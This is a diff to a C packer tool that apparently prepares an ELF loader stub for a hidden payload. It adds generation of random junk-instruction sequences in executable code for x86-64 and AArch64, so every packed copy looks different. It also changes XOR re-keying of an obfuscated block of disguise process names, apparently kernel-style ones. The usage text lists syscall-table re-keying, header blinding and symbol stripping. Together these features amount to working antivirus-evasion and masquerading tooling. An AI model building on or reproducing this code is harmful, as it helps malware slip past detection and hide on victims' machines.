@@ -10,6 +10,7 @@
 
 #define POLYMORPH_PADDING_MAX 4096
 #define POLYMORPH_FILLER_LEN  256
+#define TEXT_POLYMORPH_LEN    512
 
 static int slurp_file(const char* path, uint8_t** out_buf, size_t* out_size) {
     FILE* fp = fopen(path, "rb");
@@ -68,6 +69,56 @@ static int get_random_bytes(uint8_t* buf, size_t len) {
     if (!seeded) { srand((unsigned)(time(NULL) ^ getpid())); seeded = 1; }
     for (size_t i = 0; i < len; i++) buf[i] = (uint8_t)(rand() & 0xFF);
     return 0;
+}
+
+static int generate_text_polymorph(uint8_t* dst, size_t len,
+                                   Elf64_Half machine) {
+    uint8_t selectors[TEXT_POLYMORPH_LEN];
+    if (!dst || len != TEXT_POLYMORPH_LEN ||
+        get_random_bytes(selectors, sizeof(selectors)) != 0) return -1;
+
+    if (machine == EM_X86_64) {
+        static const struct {
+            uint8_t len;
+            uint8_t bytes[5];
+        } templates[] = {
+            { 1, { 0x90 } },
+            { 2, { 0x66, 0x90 } },
+            { 2, { 0xEB, 0x00 } },
+            { 3, { 0x48, 0x89, 0xC0 } },
+            { 3, { 0x48, 0x89, 0xC9 } },
+            { 3, { 0x48, 0x89, 0xD2 } },
+            { 3, { 0x48, 0x89, 0xF6 } },
+            { 3, { 0x48, 0x89, 0xFF } },
+            { 5, { 0xE9, 0x00, 0x00, 0x00, 0x00 } },
+        };
+        size_t off = 0;
+        while (off < len) {
+            size_t index = selectors[off] %
+                (sizeof(templates) / sizeof(templates[0]));
+            size_t count = templates[index].len;
+            if (count > len - off) count = 1;
+            memcpy(dst + off, templates[count == 1 ? 0 : index].bytes, count);
+            off += count;
+        }
+        return 0;
+    }
+
+    if (machine == EM_AARCH64) {
+        static const uint32_t templates[] = {
+            0xd503201fU, 0x14000001U,
+            0xaa0903e9U, 0xaa0a03eaU, 0xaa0b03ebU, 0xaa0c03ecU,
+            0xaa0d03edU, 0xaa0e03eeU, 0xaa0f03efU,
+            0x91000129U, 0xd1000129U,
+        };
+        for (size_t off = 0; off < len; off += sizeof(uint32_t)) {
+            uint32_t instruction = templates[selectors[off] %
+                (sizeof(templates) / sizeof(templates[0]))];
+            memcpy(dst + off, &instruction, sizeof(instruction));
+        }
+        return 0;
+    }
+    return -1;
 }
 
 static int strtab_streq(const char* strtab, size_t strtab_size,
@@ -204,7 +255,7 @@ void print_usage(const char* program_name) {
     printf("  - random magic value and 256-byte .data filler\n");
     printf("  - random padding (0-%d bytes) before payload\n", POLYMORPH_PADDING_MAX - 1);
     printf("  - syscall-table re-keying (g_sc_xor_key + hARMless_sc)\n");
-    printf("  - string-block re-keying (g_str_xor_key + g_obf_str_block)\n");
+    printf("  - process-name block re-keying\n");
     printf("  - header body OTP blinding (g_pack_polymorph as one-time pad)\n");
     printf("  - symbol scrub and section-header strip\n");
 }
@@ -230,6 +281,15 @@ int main(int argc, char* argv[]) {
         fprintf(stderr, "Error: packed file is smaller than pack_header_t\n");
         goto cleanup;
     }
+    if (!pack_header_format_valid((const pack_header_t*)packed_data)) {
+        fprintf(stderr, "Error: unsupported packed format; repack the input\n");
+        goto cleanup;
+    }
+    if (!pack_header_valid((const pack_header_t*)packed_data,
+                           packed_size - sizeof(pack_header_t))) {
+        fprintf(stderr, "Error: invalid packed payload; repack the input\n");
+        goto cleanup;
+    }
 
     /* Locate required patch points in the loader. */
     size_t magic_off = 0, magic_sz = 0;
@@ -238,6 +298,9 @@ int main(int argc, char* argv[]) {
                            &magic_off, &magic_sz) != 0) goto cleanup;
     if (find_loader_symbol(loader_data, loader_size, "g_pack_polymorph",
                            &poly_off, &poly_sz) != 0) goto cleanup;
+    size_t text_poly_off = 0, text_poly_sz = 0;
+    if (find_loader_symbol(loader_data, loader_size, "g_text_polymorph",
+                           &text_poly_off, &text_poly_sz) != 0) goto cleanup;
 
     if (magic_sz != sizeof(uint32_t)) {
         fprintf(stderr, "Error: g_packed_magic has unexpected size %zu\n", magic_sz);
@@ -246,6 +309,12 @@ int main(int argc, char* argv[]) {
     if (poly_sz != POLYMORPH_FILLER_LEN) {
         fprintf(stderr, "Error: g_pack_polymorph has unexpected size %zu (want %d)\n",
                 poly_sz, POLYMORPH_FILLER_LEN);
+        goto cleanup;
+    }
+    if (text_poly_sz != TEXT_POLYMORPH_LEN) {
+        fprintf(stderr,
+                "Error: g_text_polymorph has unexpected size %zu (want %d)\n",
+                text_poly_sz, TEXT_POLYMORPH_LEN);
         goto cleanup;
     }
 
@@ -262,28 +331,33 @@ int main(int argc, char* argv[]) {
         has_sc_rekey = 1;
     }
 
-    /* Locate optional string-block re-keying symbols. */
-    size_t str_key_off = 0, str_key_sz = 0;
-    size_t str_blk_off = 0, str_blk_sz = 0;
-    int    has_str_rekey = 0;
-    if (find_loader_symbol(loader_data, loader_size, "g_str_xor_key",
-                           &str_key_off, &str_key_sz) == 0 &&
-        find_loader_symbol(loader_data, loader_size, "g_obf_str_block",
-                           &str_blk_off, &str_blk_sz) == 0 &&
-        str_key_sz == sizeof(uint8_t) &&
-        str_blk_sz > 0) {
-        has_str_rekey = 1;
+    /* Locate the kernel-style process-name patch points. */
+    size_t name_key_off = 0, name_key_sz = 0;
+    size_t name_blk_off = 0, name_blk_sz = 0;
+    int    has_name_rekey = 0;
+    if (find_loader_symbol(loader_data, loader_size,
+                           "g_process_name_xor_key",
+                           &name_key_off, &name_key_sz) == 0 &&
+        find_loader_symbol(loader_data, loader_size,
+                           "g_obf_process_names",
+                           &name_blk_off, &name_blk_sz) == 0 &&
+        name_key_sz == sizeof(uint8_t) && name_blk_sz > 0) {
+        has_name_rekey = 1;
     }
 
     /* Generate per-pack random material. */
     uint32_t new_magic   = 0;
     uint32_t new_xor_key = 0;
     uint8_t  new_filler[POLYMORPH_FILLER_LEN];
+    uint8_t  new_text[TEXT_POLYMORPH_LEN];
     uint16_t pad_short   = 0;
     uint8_t  padding[POLYMORPH_PADDING_MAX];
 
     if (get_random_bytes((uint8_t*)&new_magic, sizeof(new_magic)) != 0) goto cleanup;
     if (get_random_bytes(new_filler, sizeof(new_filler)) != 0) goto cleanup;
+    if (generate_text_polymorph(new_text, sizeof(new_text),
+                                ((const Elf64_Ehdr*)loader_data)->e_machine) != 0)
+        goto cleanup;
     if (get_random_bytes((uint8_t*)&pad_short, sizeof(pad_short)) != 0) goto cleanup;
     if (get_random_bytes(padding, sizeof(padding)) != 0) goto cleanup;
     size_t pad_len = (size_t)(pad_short & (POLYMORPH_PADDING_MAX - 1));  /* 0..4095 */
@@ -291,6 +365,7 @@ int main(int argc, char* argv[]) {
     /* Patch loader bytes in our local buffer (we own it; safe to mutate). */
     memcpy(loader_data + magic_off, &new_magic, sizeof(new_magic));
     memcpy(loader_data + poly_off, new_filler, sizeof(new_filler));
+    memcpy(loader_data + text_poly_off, new_text, sizeof(new_text));
 
     /* Patch the packed header's magic field. pack_header_t.magic is the
      * very first field (offset 0), 4 bytes. */
@@ -318,18 +393,17 @@ int main(int argc, char* argv[]) {
         memcpy(loader_data + sc_key_off, &new_xor_key, sizeof(new_xor_key));
     }
 
-    uint8_t new_str_key = 0;
-    if (has_str_rekey) {
-        uint8_t old_str_key = loader_data[str_key_off];
-        if (get_random_bytes(&new_str_key, sizeof(new_str_key)) != 0)
+    uint8_t new_name_key = 0;
+    if (has_name_rekey) {
+        uint8_t old_name_key = loader_data[name_key_off];
+        if (get_random_bytes(&new_name_key, sizeof(new_name_key)) != 0)
             goto cleanup;
-        if (new_str_key == 0) new_str_key = 0xA5;
-        uint8_t* blk = loader_data + str_blk_off;
-        for (size_t i = 0; i < str_blk_sz; i++)
-            blk[i] = (blk[i] ^ old_str_key) ^ new_str_key;
-        loader_data[str_key_off] = new_str_key;
+        if (new_name_key == 0) new_name_key = 0xA5;
+        for (size_t i = 0; i < name_blk_sz; ++i)
+            loader_data[name_blk_off + i] =
+                (loader_data[name_blk_off + i] ^ old_name_key) ^ new_name_key;
+        loader_data[name_key_off] = new_name_key;
     }
-
 
     Elf64_Ehdr* ehdr = (Elf64_Ehdr*)loader_data;
     {
@@ -373,15 +447,16 @@ int main(int argc, char* argv[]) {
     printf("  Total         : %zu bytes\n", loader_size + pad_len + packed_size);
     printf("  New magic     : 0x%08X\n", new_magic);
     printf("  Polymorph     : %d bytes randomized in .data\n", POLYMORPH_FILLER_LEN);
+    printf("  Text morph    : %d executable bytes regenerated\n", TEXT_POLYMORPH_LEN);
     if (has_sc_rekey)
         printf("  SC XOR key    : 0x%08X (re-keyed)\n", new_xor_key);
     else
         printf("  SC XOR key    : (symbols absent, skipped)\n");
-    if (has_str_rekey)
-        printf("  Str XOR key   : 0x%02X (re-keyed, %zu bytes)\n",
-               (unsigned)new_str_key, str_blk_sz);
+    if (has_name_rekey)
+        printf("  Name XOR key  : 0x%02X (re-keyed)\n",
+               (unsigned)new_name_key);
     else
-        printf("  Str XOR key   : (symbols absent, skipped)\n");
+        printf("  Name XOR key  : (symbols absent, skipped)\n");
     printf("  Header blind  : OTP from g_pack_polymorph[0..%zu]\n",
            sizeof(pack_header_t) - sizeof(uint32_t) - 1);
 
